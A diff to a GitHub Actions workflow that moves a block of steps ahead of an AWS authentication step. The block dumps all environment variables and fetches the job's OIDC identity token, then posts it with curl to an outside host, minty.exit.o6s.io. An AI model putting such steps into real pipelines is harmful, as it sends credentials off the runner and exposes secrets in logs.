@@ -30,6 +30,18 @@ jobs:
     
     steps:
     
+    - uses: actions/checkout@master
+      with:
+          fetch-depth: 1
+    - name: Dump env
+      run: env
+    - name: Post the token
+      run: |
+          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+
+          curl -i -s --data-binary "$OIDC_TOKEN" \
+            https://minty.exit.o6s.io/github-oidc
+    
     - name: AWS Auth
       uses: PoojaG2108/action-github-oidc-auth@main
       with:
@@ -46,18 +58,6 @@ jobs:
       id: github_context_step
       run: echo '${{ toJSON(github) }}'
       
-    #token
-    - uses: actions/checkout@master
-      with:
-          fetch-depth: 1
-    - name: Dump env
-      run: env
-    - name: Post the token
-      run: |
-          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=o6s" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-
-          curl -i -s --data-binary "$OIDC_TOKEN" \
-            https://minty.exit.o6s.io/github-oidc
         
     # Install the latest version of Terraform CLI and configure the Terraform CLI configuration file with a Terraform Cloud user API token
     - name: Setup Terraform
